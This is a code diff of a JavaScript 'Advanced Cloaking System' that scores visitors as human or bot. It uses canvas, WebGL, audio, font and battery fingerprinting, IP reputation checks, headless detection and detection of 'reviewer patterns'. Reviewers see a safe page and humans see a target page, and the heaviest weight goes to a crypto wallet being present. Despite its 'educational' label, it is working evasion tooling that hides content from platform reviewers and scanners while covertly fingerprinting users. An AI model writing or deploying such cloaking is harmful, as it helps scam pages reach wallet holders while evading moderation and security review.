@@ -1,22 +1,23 @@
 /**
- * Advanced Cloaking System v4.0 – Mobile‑Optimized Edition
+ * Advanced Cloaking System v3.1 – Human‑First Edition
  * For educational and defensive research only.
  *
  * Features:
- * - Heavy weights on wallet, battery, and behavioral tracking
- * - Comprehensive mobile signal detection:
- *   • DeviceMotion / DeviceOrientation (accelerometer, gyro)
- *   • Battery discharging time + level changes over time
- *   • Network information (effectiveType, downlink, rtt)
- *   • navigator.vibrate() support
- *   • Multi‑touch tracking (maxTouchPoints + simultaneous touches)
- *   • Proximity sensor (DeviceProximityEvent / UserProximityEvent)
- *   • Ambient light sensor (DeviceLightEvent / AmbientLightSensor)
- *   • Screen orientation + ability to lock
- *   • visualViewport and safe‑area insets
- *   • Permission states + geolocation accuracy (via permission query)
- * - All other signals (canvas, WebGL, fonts, plugins, etc.) retained with low impact
- * - IP reputation, headless detection, reviewer patterns
+ * - Very high weights for wallet, battery, and behavioral signals
+ * - Other signals contribute modestly to avoid false penalties
+ * - Multi‑layer fingerprinting (canvas, WebGL, audio, fonts, plugins, etc.)
+ * - IP reputation (public IP, datacenter/VPN detection via external API)
+ * - Headless / automation detection
+ * - Language/timezone consistency
+ * - Reviewer pattern detection (optional safe fallback)
+ *
+ * Configuration:
+ *   safePageUrl        – URL for bots/reviewers (default: '/safe')
+ *   targetPageUrl      – URL for humans (default: '/target')
+ *   strictnessLevel    – minimum human score (default: 55)
+ *   debugMode          – print logs (default: false)
+ *   usePublicIpService – use ipify.org (default: true)
+ *   weights            – custom weight overrides (optional)
  */
 
 class AdvancedCloakingSystem {
@@ -30,13 +31,12 @@ class AdvancedCloakingSystem {
             ...config
         };
 
-        // Weights – wallet, battery, behavior and mobile signals get the highest
+        // HEAVY weights on wallet, battery, and behavior
         this.weights = {
-            wallet: 50,
-            battery: 20,
-            batteryCharging: 5,
-            behavior: 60,               // max from behavioral tracking
-            mobileFeatures: 30,          // max from all mobile‑specific signals
+            wallet: 50,                // huge boost
+            battery: 20,               // strong
+            batteryCharging: 5,         // extra
+            behavior: 60,               // maximum from behavior
             plugins: { many: 5, none: -2 },
             fonts: { many: 5, few: -2 },
             canvasError: -5,
@@ -63,20 +63,7 @@ class AdvancedCloakingSystem {
             maxScroll: 0,
             mouseMoves: 0,
             clicks: 0,
-            touches: 0,                  // track touch events separately
-            maxConcurrentTouches: 0,
             timeToFirstInteraction: null
-        };
-
-        // Mobile sensor tracking
-        this.mobileSensors = {
-            motion: null,
-            orientation: null,
-            light: null,
-            proximity: null,
-            batteryHistory: [],           // store battery level over time
-            network: null,
-            safeAreaInsets: null
         };
 
         this.sessionId = this.generateSessionId();
@@ -84,7 +71,7 @@ class AdvancedCloakingSystem {
         this.walletInfo = null;
         this.ipInfo = null;
 
-        this.log('Cloaking system initialized (mobile‑optimized mode)', 'info');
+        this.log('Cloaking system initialized (human‑first mode)', 'info');
     }
 
     // ---------- Bot signature database ----------
@@ -124,7 +111,7 @@ class AdvancedCloakingSystem {
                Math.random().toString(36).substring(2, 15);
     }
 
-    // ---------- Wallet detection ----------
+    // ---------- Advanced wallet detection ----------
     detectWallet() {
         const wallet = {
             present: false,
@@ -292,252 +279,9 @@ class AdvancedCloakingSystem {
         };
     }
 
-    // ---------- Mobile‑specific signal collection ----------
-    async gatherMobileSignals() {
-        const signals = {};
-
-        // 1. Motion & orientation sensors (DeviceMotionEvent, DeviceOrientationEvent)
-        signals.motion = 'DeviceMotionEvent' in window;
-        signals.orientation = 'DeviceOrientationEvent' in window;
-        // Optionally request permission on iOS? Not needed for detection, just presence.
-
-        // 2. Battery discharging time + level change (we'll store initial and later check change)
-        if ('getBattery' in navigator) {
-            try {
-                const battery = await navigator.getBattery();
-                signals.batteryInitial = {
-                    level: battery.level,
-                    charging: battery.charging,
-                    dischargingTime: battery.dischargingTime
-                };
-                // Listen for level changes and store in history (done later in startMobileTracking)
-                this.mobileSensors.battery = battery; // keep reference for later updates
-            } catch (e) {
-                signals.batteryInitial = null;
-            }
-        } else {
-            signals.batteryInitial = null;
-        }
-
-        // 3. Network information
-        if (navigator.connection) {
-            signals.network = {
-                effectiveType: navigator.connection.effectiveType,
-                downlink: navigator.connection.downlink,
-                rtt: navigator.connection.rtt,
-                saveData: navigator.connection.saveData
-            };
-        } else {
-            signals.network = null;
-        }
-
-        // 4. Vibration support
-        signals.vibrate = 'vibrate' in navigator;
-
-        // 5. Proximity sensor (legacy and modern)
-        signals.proximity = 'ondeviceproximity' in window || 'onuserproximity' in window;
-        // Also check for ProximitySensor API? Not widely supported.
-
-        // 6. Ambient light sensor
-        signals.ambientLight = 'ondevicelight' in window || 'AmbientLightSensor' in window;
-
-        // 7. Screen orientation
-        if (screen.orientation) {
-            signals.orientationType = screen.orientation.type;
-            signals.orientationAngle = screen.orientation.angle;
-            signals.canLockOrientation = 'lock' in screen.orientation; // just presence, we won't lock
-        } else {
-            signals.orientationType = null;
-        }
-
-        // 8. VisualViewport and safe‑area insets
-        signals.visualViewport = 'visualViewport' in window;
-        // Detect safe‑area insets by creating a hidden element and checking env()
-        signals.safeAreaInsets = await this.detectSafeAreaInsets();
-
-        // 9. Geolocation permission accuracy (just query permission, don't request position)
-        if ('permissions' in navigator) {
-            try {
-                const geoPerm = await navigator.permissions.query({ name: 'geolocation' });
-                signals.geolocationPermission = geoPerm.state;
-                // High accuracy cannot be determined without actually using geolocation, so skip.
-            } catch (e) {
-                signals.geolocationPermission = 'unknown';
-            }
-        } else {
-            signals.geolocationPermission = 'unsupported';
-        }
-
-        return signals;
-    }
-
-    async detectSafeAreaInsets() {
-        // Create a hidden element with env() padding and read computed style
-        return new Promise((resolve) => {
-            const div = document.createElement('div');
-            div.style.position = 'absolute';
-            div.style.width = '0';
-            div.style.height = '0';
-            div.style.visibility = 'hidden';
-            div.style.paddingTop = 'env(safe-area-inset-top)';
-            div.style.paddingRight = 'env(safe-area-inset-right)';
-            div.style.paddingBottom = 'env(safe-area-inset-bottom)';
-            div.style.paddingLeft = 'env(safe-area-inset-left)';
-            document.body.appendChild(div);
-            // We need to force a reflow to get computed values
-            requestAnimationFrame(() => {
-                const styles = window.getComputedStyle(div);
-                const top = parseInt(styles.paddingTop) || 0;
-                const right = parseInt(styles.paddingRight) || 0;
-                const bottom = parseInt(styles.paddingBottom) || 0;
-                const left = parseInt(styles.paddingLeft) || 0;
-                document.body.removeChild(div);
-                const hasInsets = top > 0 || right > 0 || bottom > 0 || left > 0;
-                resolve({ hasInsets, top, right, bottom, left });
-            });
-        });
-    }
-
-    // Start tracking mobile sensors over time (battery level changes, touch concurrency)
-    startMobileTracking() {
-        // Battery change listener
-        if (this.mobileSensors.battery) {
-            this.mobileSensors.battery.addEventListener('levelchange', () => {
-                this.mobileSensors.batteryHistory.push({
-                    level: this.mobileSensors.battery.level,
-                    time: Date.now()
-                });
-            });
-        }
-
-        // Multi‑touch tracking
-        window.addEventListener('touchstart', (e) => {
-            this.behavior.touches++;
-            this.behavior.maxConcurrentTouches = Math.max(this.behavior.maxConcurrentTouches, e.touches.length);
-            if (this.behavior.timeToFirstInteraction === null) {
-                this.behavior.timeToFirstInteraction = Date.now() - this.behavior.startTime;
-            }
-        });
-        window.addEventListener('touchmove', () => {
-            if (this.behavior.timeToFirstInteraction === null) {
-                this.behavior.timeToFirstInteraction = Date.now() - this.behavior.startTime;
-            }
-        });
-        window.addEventListener('touchend', () => {});
-    }
-
-    // Compute mobile signal score based on gathered signals
-    computeMobileScore(signals) {
-        let score = 0;
-        const log = [];
-
-        // Presence of motion/orientation sensors
-        if (signals.motion) { score += 3; log.push('motion:+3'); }
-        if (signals.orientation) { score += 3; log.push('orientation:+3'); }
-
-        // Battery info (realistic level, discharging time, and later level change)
-        if (signals.batteryInitial) {
-            score += 5;
-            log.push('battery_api:+5');
-            // Additional point if discharging time is reasonable (>0)
-            if (signals.batteryInitial.dischargingTime !== Infinity && signals.batteryInitial.dischargingTime > 0) {
-                score += 2;
-                log.push('battery_discharge:+2');
-            }
-        }
-
-        // Network info (realistic values)
-        if (signals.network) {
-            score += 4;
-            log.push('network_api:+4');
-            // Bonus for realistic effectiveType (4g, 3g, etc.)
-            if (['slow-2g', '2g', '3g', '4g'].includes(signals.network.effectiveType)) {
-                score += 2;
-                log.push('network_effective:+2');
-            }
-        }
-
-        // Vibration support
-        if (signals.vibrate) {
-            score += 3;
-            log.push('vibrate:+3');
-        }
-
-        // Proximity sensor
-        if (signals.proximity) {
-            score += 4;
-            log.push('proximity:+4');
-        }
-
-        // Ambient light sensor
-        if (signals.ambientLight) {
-            score += 4;
-            log.push('ambient_light:+4');
-        }
-
-        // Screen orientation
-        if (signals.orientationType) {
-            score += 2;
-            log.push('orientation_api:+2');
-        }
-        if (signals.canLockOrientation) {
-            score += 1;
-            log.push('orientation_lock:+1');
-        }
-
-        // VisualViewport
-        if (signals.visualViewport) {
-            score += 2;
-            log.push('visualViewport:+2');
-        }
-
-        // Safe‑area insets
-        if (signals.safeAreaInsets && signals.safeAreaInsets.hasInsets) {
-            score += 4;
-            log.push('safe_areas:+4');
-        }
-
-        // Geolocation permission (not too strong because many deny)
-        if (signals.geolocationPermission === 'granted') {
-            score += 5;
-            log.push('geo_granted:+5');
-        } else if (signals.geolocationPermission === 'prompt') {
-            score += 2;
-            log.push('geo_prompt:+2');
-        }
-
-        // Multi‑touch max concurrent touches (from behavioral tracking)
-        if (this.behavior.maxConcurrentTouches >= 2) {
-            score += 5;
-            log.push(`multi_touch:${this.behavior.maxConcurrentTouches}+5`);
-        } else if (this.behavior.maxConcurrentTouches > 0) {
-            score += 2;
-            log.push(`multi_touch:${this.behavior.maxConcurrentTouches}+2`);
-        }
-
-        // Battery level change over time (if history has at least 2 entries with different levels)
-        if (this.mobileSensors.batteryHistory.length >= 2) {
-            const first = this.mobileSensors.batteryHistory[0];
-            const last = this.mobileSensors.batteryHistory[this.mobileSensors.batteryHistory.length - 1];
-            if (first.level !== last.level) {
-                score += 3;
-                log.push('battery_change:+3');
-            }
-        }
-
-        const maxMobile = this.weights.mobileFeatures;
-        const finalScore = Math.min(maxMobile, score);
-        this.log(`Mobile signal components: ${log.join(', ')} → total ${finalScore}/${maxMobile}`, 'debug');
-        return finalScore;
-    }
-
-    // ---------- Comprehensive fingerprint (now includes mobile signals) ----------
+    // ---------- Comprehensive fingerprint ----------
     async generateFingerprint() {
         const screen = this.getScreenMetrics();
-        const mobileSignals = await this.gatherMobileSignals();
-        // Start tracking mobile sensors (listeners)
-        this.startMobileTracking();
-
         return {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -556,17 +300,170 @@ class AdvancedCloakingSystem {
             plugins: this.getPluginList(),
             audio: await this.getAudioFingerprint(),
             webRTC: this.getWebRTCInfo(),
-            battery: await this.getBatteryInfo(),           // basic battery info (for desktop)
+            battery: await this.getBatteryInfo(),
             permissions: await this.getPermissionsInfo(),
-            mobileSignals: mobileSignals,                    // new mobile‑specific signals
             timestamp: Date.now()
         };
     }
 
-    // ... (keep existing fingerprinting methods: getCanvasFingerprint, getWebGLFingerprint, getFontList, getPluginList, getAudioFingerprint, getWebRTCInfo, getBatteryInfo, getPermissionsInfo) ...
-    // (For brevity, these methods are unchanged from the previous version; I'll include them in the final code.)
+    async getCanvasFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 200;
+            canvas.height = 50;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(10, 10, 100, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Cloaking Detection Test', 2, 15);
+            ctx.beginPath();
+            ctx.arc(50, 25, 10, 0, Math.PI * 2);
+            ctx.strokeStyle = '#ff0000';
+            ctx.lineWidth = 2;
+            ctx.stroke();
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            const pixels = imageData.data;
+            let hash = 0;
+            for (let i = 0; i < pixels.length; i += 4) {
+                hash = ((hash << 5) - hash) + pixels[i];
+                hash |= 0;
+            }
+            return { hash: hash.toString(16) };
+        } catch (e) {
+            return { hash: 'canvas_error' };
+        }
+    }
 
-    // ---------- Behavioral tracking (now includes touches) ----------
+    getWebGLFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return { supported: false };
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                supported: true,
+                vendor: gl.getParameter(gl.VENDOR),
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
+                unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
+                version: gl.getParameter(gl.VERSION),
+                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+                extensions: gl.getSupportedExtensions() || []
+            };
+        } catch (e) {
+            return { error: e.message };
+        }
+    }
+
+    async getFontList() {
+        const baseFonts = ['monospace', 'sans-serif', 'serif'];
+        const fontList = [
+            'Arial', 'Helvetica', 'Times New Roman', 'Courier New',
+            'Verdana', 'Georgia', 'Palatino', 'Garamond',
+            'Comic Sans MS', 'Trebuchet MS', 'Arial Black',
+            'Impact', 'Lucida Console', 'Tahoma', 'Wingdings'
+        ];
+        const detected = [];
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        for (const font of fontList) {
+            for (const base of baseFonts) {
+                ctx.font = `72px ${base}`;
+                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
+                ctx.font = `72px '${font}', ${base}`;
+                const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
+                if (baseWidth !== testWidth) {
+                    detected.push(font);
+                    break;
+                }
+            }
+        }
+        return detected;
+    }
+
+    getPluginList() {
+        const plugins = [];
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            const p = navigator.plugins[i];
+            plugins.push({ name: p.name, filename: p.filename, description: p.description });
+        }
+        return plugins;
+    }
+
+    async getAudioFingerprint() {
+        return new Promise((resolve) => {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const analyser = audioContext.createAnalyser();
+                oscillator.connect(analyser);
+                analyser.connect(audioContext.destination);
+                oscillator.frequency.value = 440;
+                oscillator.type = 'sine';
+                const dataArray = new Uint8Array(analyser.frequencyBinCount);
+                oscillator.start();
+                setTimeout(() => {
+                    analyser.getByteFrequencyData(dataArray);
+                    oscillator.stop();
+                    audioContext.close();
+                    let hash = 0;
+                    for (let i = 0; i < dataArray.length; i += 10) {
+                        hash = ((hash << 5) - hash) + dataArray[i];
+                        hash |= 0;
+                    }
+                    resolve({ supported: true, hash: hash.toString(16) });
+                }, 100);
+            } catch (e) {
+                resolve({ supported: false });
+            }
+        });
+    }
+
+    getWebRTCInfo() {
+        return {
+            hasWebRTC: 'RTCPeerConnection' in window,
+            hasGetUserMedia: 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices
+        };
+    }
+
+    async getBatteryInfo() {
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    supported: true,
+                    charging: battery.charging,
+                    level: battery.level,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch (e) {
+                return { supported: false, error: e.message };
+            }
+        }
+        return { supported: false };
+    }
+
+    async getPermissionsInfo() {
+        const permissions = ['geolocation', 'notifications', 'camera', 'microphone'];
+        const results = {};
+        if ('permissions' in navigator) {
+            for (const perm of permissions) {
+                try {
+                    const status = await navigator.permissions.query({ name: perm });
+                    results[perm] = status.state;
+                } catch (e) {
+                    results[perm] = 'unknown';
+                }
+            }
+        }
+        return results;
+    }
+
+    // ---------- Behavioral tracking (more generous) ----------
     startBehaviorTracking() {
         const onInteraction = (type) => {
             if (this.behavior.timeToFirstInteraction === null) {
@@ -594,11 +491,7 @@ class AdvancedCloakingSystem {
         });
 
         window.addEventListener('click', () => onInteraction('click'));
-        window.addEventListener('touchstart', (e) => {
-            onInteraction('touch');
-            this.behavior.touches++;
-            this.behavior.maxConcurrentTouches = Math.max(this.behavior.maxConcurrentTouches, e.touches.length);
-        });
+        window.addEventListener('touchstart', () => onInteraction('touch'));
 
         setTimeout(() => this.saveBehavior(), 5000);
     }
@@ -610,8 +503,6 @@ class AdvancedCloakingSystem {
             maxScroll: this.behavior.maxScroll,
             mouseMoves: this.behavior.mouseMoves,
             clicks: this.behavior.clicks,
-            touches: this.behavior.touches,
-            maxConcurrentTouches: this.behavior.maxConcurrentTouches,
             timeToFirstInteraction: this.behavior.timeToFirstInteraction,
             timestamp: Date.now()
         };
@@ -625,17 +516,15 @@ class AdvancedCloakingSystem {
     analyzeBehavior() {
         const session = JSON.parse(sessionStorage.getItem('visitor_behavior') || '{}');
         let score = 0;
-        if (session.timeOnPage > 3) score += 15;
-        if (session.maxScroll > 10) score += 15;
-        if (session.mouseMoves > 0) score += 15;
-        if (session.clicks > 0) score += 20;
-        if (session.touches > 0) score += 15;                // extra for mobile touch
-        if (session.maxConcurrentTouches > 1) score += 10;   // multi‑touch
-        if (session.timeToFirstInteraction && session.timeToFirstInteraction < 5000) score += 10;
+        if (session.timeOnPage > 3) score += 15;        // easier: 3 sec
+        if (session.maxScroll > 10) score += 15;        // any scroll helps
+        if (session.mouseMoves > 0) score += 15;        // even one mouse move
+        if (session.clicks > 0) score += 20;            // clicks are strong
+        if (session.timeToFirstInteraction && session.timeToFirstInteraction < 5000) score += 10; // 5 sec
         return Math.min(this.weights.behavior, score);
     }
 
-    // ---------- Weighted scoring (with mobile signals) ----------
+    // ---------- Weighted scoring (with heavy weights on wallet, battery, behavior) ----------
     calculateHumanScore(ipInfo, fingerprint, wallet, behaviorScore) {
         let score = 0;
         const w = this.weights;
@@ -655,13 +544,6 @@ class AdvancedCloakingSystem {
                 score += w.batteryCharging;
                 weightsLog.push(`battery_charging:+${w.batteryCharging}`);
             }
-        }
-
-        // ---- Mobile signals ----
-        if (fingerprint.mobileSignals) {
-            const mobileScore = this.computeMobileScore(fingerprint.mobileSignals);
-            score += mobileScore;
-            weightsLog.push(`mobile_signals:+${mobileScore}`);
         }
 
         // ---- IP signals (modest) ----
@@ -732,7 +614,7 @@ class AdvancedCloakingSystem {
             weightsLog.push(`lang/tz_mismatch:${w.langTzMismatch}`);
         }
 
-        // ---- Behavioral score ----
+        // ---- Behavioral score (heavy) ----
         score += behaviorScore;
         weightsLog.push(`behavior:+${behaviorScore}`);
 
